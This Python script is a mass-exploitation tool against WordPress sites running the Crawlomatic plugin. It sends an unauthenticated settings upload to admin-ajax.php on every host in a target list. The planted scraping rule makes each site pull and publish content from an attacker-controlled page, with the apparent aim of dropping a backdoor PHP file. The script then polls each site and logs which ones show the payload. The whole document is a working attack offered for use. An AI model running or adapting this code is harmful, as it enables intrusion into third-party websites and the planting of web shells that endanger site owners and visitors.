import requests
import asyncio
import aiohttp
import time
import os
from bs4 import BeautifulSoup

# ============ CONFIGURATION ============
TARGETS_FILE = "list.txt"
WAITING_FILE = "waiting.txt"
INTERVAL_RESULT_FILE = "result_interval.txt"
TRIGGER_KEYWORD = "yourbackdoornameonpost.php"
CHECK_INTERVAL = 20 * 60 

CRAWLOMATIC_PAYLOAD = {
    "crawlomatic_plugin_settings": {
        "rules": {
            "setsuna_bot": {
                "enabled": True,
                "source_type": "single",
                "source_single_url": "https://yourweb.com/yourpost/",
                "target_post_type": "post",
                "target_post_status": "publish",
                "scrape_title": True,
                "scrape_content": True,
                "strip_html_tags": False,
                "enable_caching": False,
                "rewrite_links": False,
                "post_custom_fields": [],
                "save_images_locally": True,
                "delete_source_after": False,
                "custom_post_template": "",
                "schedule_interval": "once",
                "execution_frequency": "once"
            }
        }
    }
}

# ============ FUNCTION UPLOAD JSON ============
def send_setting_json(target):
    try:
        url = f"http://{target}/wp-admin/admin-ajax.php?action=crawlomatic_register_mysettings"
        files = {
            'crawlomatic_restore_rules': (None, ''),
            'crawlomatic-file-upload-rules': ('setting.json', str(CRAWLOMATIC_PAYLOAD), 'application/json')
        }
        r = requests.post(url, files=files, timeout=15)
        if r.status_code == 200:
            print(f"[+] Uploaded setting.json to {target}")
            with open(WAITING_FILE, "a") as f:
                f.write(target + "\n")
        else:
            print(f"[-] Failed to upload setting.json to {target} ({r.status_code})")
    except Exception as e:
        print(f"[!] Error uploading to {target}: {e}")

# ============ FUNCTION CRAWL CHECK ============
async def check_cron(target):
    try:
        url = f"http://{target}/"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=20) as resp:
                html = await resp.text()
                if TRIGGER_KEYWORD.lower() in html.lower():
                    print(f"[!] CRON -> Payload Detected On {target}")
                    with open(INTERVAL_RESULT_FILE, "a") as f:
                        f.write(f"[VULN] {target} - Payload Detected!. Cron plugin Crawlomatic success created!.\n")
    except:
        pass

# ============ LOOP FUNCTION ============
async def main():
    if os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
            for target in targets:
                send_setting_json(target)

    while True:
        print("[*] Waiting cron...\n")
        if os.path.exists(WAITING_FILE):
            with open(WAITING_FILE, "r") as f:
                waiting_targets = [line.strip() for line in f if line.strip()]

            tasks = [check_cron(t) for t in waiting_targets]
            await asyncio.gather(*tasks)
        await asyncio.sleep(CHECK_INTERVAL)

# ============ RUN ============
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Stoped By User.")

